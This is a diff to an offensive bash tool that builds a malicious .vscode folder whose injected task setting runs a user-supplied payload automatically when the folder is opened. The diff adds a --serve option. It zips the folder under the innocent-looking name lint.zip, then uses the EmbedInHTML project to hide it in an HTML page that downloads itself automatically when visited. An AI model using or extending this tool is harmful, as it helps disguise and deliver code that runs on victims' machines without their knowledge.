@@ -8,6 +8,9 @@ for i in "$@"; do
     --zip|-z)
         ZIP=true
         ;;
+    --serve|-s)
+        SERVE=true
+        ;;
     --help|-h)
         HELP=true
         ;;
@@ -31,6 +34,7 @@ then
     echo -e "Usage: ${GREEN}$0${NC} [flag] ${GREEN}'${NC}[payload]${GREEN}'${NC} "
     echo -e "\t--windows/-w\tspecify specific payload for windows"
     echo -e "\t--zip/-z\tzip the malicious .vscode folder"
+    echo -e "\t--serve/-s\tserve zip file in HTML (automatically dl when browsed, use embeddInHTML)"
     echo 
     exit 92
 fi
@@ -57,7 +61,19 @@ echo -e "${CYAN}[${RED}+${CYAN}]${NC} Inject automatic task run setting"
 echo "${SETTING_JSON}" > .vscode/settings.json
 
 # Zip it?
-if [[ "$ZIP" ]];
+if [[ "$ZIP" ]] || [[ "$SERVE" ]];
 then
-    echo "zipping"
+    echo -e "${CYAN}[${RED}+${CYAN}]${NC} Zip .vscode folder to lint.zip"
+    zip -r lint.zip .vscode
+fi
+
+if [[ "$SERVE" ]];
+then
+    echo -e "${CYAN}[${RED}+${CYAN}]${NC} Embed linter.zip in HTML (${BLUE}index.html${NC})"
+    git clone https://github.com/Arno0x/EmbedInHTML.git &>/dev/null
+    cd EmbedInHTML
+    python2.7 embedInHTML.py -k vscodepwn -f ../lint.zip -o index.html -m application/zip &>/dev/null
+    mv output/index.html ..
+    cd ..
+    rm -rf EmbedInHTML
 fi
